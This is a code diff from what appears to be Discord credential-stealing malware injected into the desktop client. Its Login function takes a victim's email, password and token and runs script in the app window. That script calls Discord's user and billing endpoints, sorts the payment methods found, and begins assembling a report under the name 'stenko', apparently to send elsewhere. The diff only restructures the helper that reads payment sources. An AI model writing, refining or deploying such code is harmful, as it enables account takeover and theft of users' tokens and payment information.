@@ -172,6 +172,26 @@ function GetBadges(flags) {
 	return badges
 }
 
+function Cool() {
+	const json = JSON.parse(info3)
+	var billing = "";
+	json.forEach(z => {
+		if (z.type == "") {
+			return "no payment method"
+		} else if (z.type == 2 && z.invalid != !0) {
+			billing += "paypal"
+		} else if (z.type == 1 && z.invalid != !0) {
+			billing += "credit card"
+		} else {
+			return "no payment method"
+		}
+	})
+	if (billing == "") {
+		billing = "no payment method"
+	}
+	return billing
+}	
+
 function Login(email, password, token) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`
@@ -180,32 +200,12 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-		window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-
-							function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "no payment method"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "paypal"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "credit card"
-									} else {
-										return "no payment method"
-									}
-								})
-								if (billing == "") {
-									billing = "no payment method"
-								}
-								return billing
-							}			
+	window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText`, !0).then((info3) => {		
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
